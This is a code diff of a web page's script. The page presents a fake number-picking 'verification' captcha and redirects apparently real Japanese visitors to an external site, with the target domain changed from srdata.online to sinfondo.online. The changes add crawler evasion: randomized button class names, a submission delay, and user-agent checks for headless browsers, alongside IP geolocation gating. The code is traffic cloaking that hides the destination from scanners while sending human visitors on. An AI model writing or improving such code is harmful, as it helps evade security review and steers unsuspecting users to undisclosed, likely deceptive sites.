@@ -41,9 +41,9 @@ body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
 // ✅ 日本真人用户 跳转目标URL
 // ==============================================
 const REAL_TARGETS = [
-  "https://srdata.online/ja",
-  "https://srdata.online/ja",
-  "https://srdata.online/ja"
+  "https://sinfondo.online/ja",
+  "https://sinfondo.online/ja",
+  "https://sinfondo.online/ja"
 ];
 
 // ==============================================
@@ -68,13 +68,11 @@ interactEvents.forEach(evt => {
 // 【终极宽松版】只判断一件事：是不是真人手动点的
 async function isJapaneseRealUser() {
   try {
-    // 👇 只有这1个判断：必须有真人交互
+    // 👇 只有这1个核心判断：必须有真人交互
     if (!userInteracted) return false;
 
-    // ====================
-    // 以下所有条件 全部放宽
-    // ====================
-    let isJpIP = true; // IP接口异常 = 默认日本
+    // IP检测异常 = 默认日本（不拦截真人）
+    let isJpIP = true;
     try {
       const res = await fetch('https://ipapi.co/json/', { cache: 'no-store', timeout: 2000 });
       if (res.ok) {
@@ -83,14 +81,11 @@ async function isJapaneseRealUser() {
       }
     } catch (e) {}
 
-    // 语言不做强制判断
-    const lang = navigator.language || '';
+    // 语言/时间 不做任何限制，秒点也放行
     const isJpLang = true;
-
-    // 时间不做判断：秒点也允许
     const isEnoughTime = true;
 
-    // UA只拦截最明显的爬虫，不杀正常浏览器
+    // UA只拦截最明显的爬虫，避免误判真人
     const ua = navigator.userAgent || '';
     const isHeadless = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(ua);
 
@@ -107,7 +102,7 @@ function randomTarget() {
   return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
 }
 
-// ===================== 验证界面逻辑 =====================
+// ===================== 验证界面逻辑（集成2个防爬优化） =====================
 function generateCaptcha() {
   const nums = "0123456789".split('');
   const need = 2;
@@ -133,9 +128,13 @@ const submit = document.getElementById("submit");
 const status = document.getElementById("status");
 let selected = [];
 
+// 优化1：生成随机类名后缀，让爬虫无法固定定位按钮
+const randomBtnSuffix = Math.random().toString(36).slice(2, 8);
+const baseBtnClass = `num-btn ${randomBtnSuffix}`;
+
 options.forEach(o => {
   const btn = document.createElement("button");
-  btn.className = "num-btn";
+  btn.className = baseBtnClass; // 使用随机类名
   btn.innerText = o;
   btn.dataset.v = o;
   btn.onclick = () => {
@@ -159,6 +158,9 @@ submit.onclick = async () => {
     return;
   }
 
+  // 优化2：100ms真人操作延迟，过滤瞬间提交的爬虫（真人无感知）
+  await new Promise(resolve => setTimeout(resolve, 100));
+  
   // 验证通过 → 跳转
   const valid = await isJapaneseRealUser();
   if (valid) {
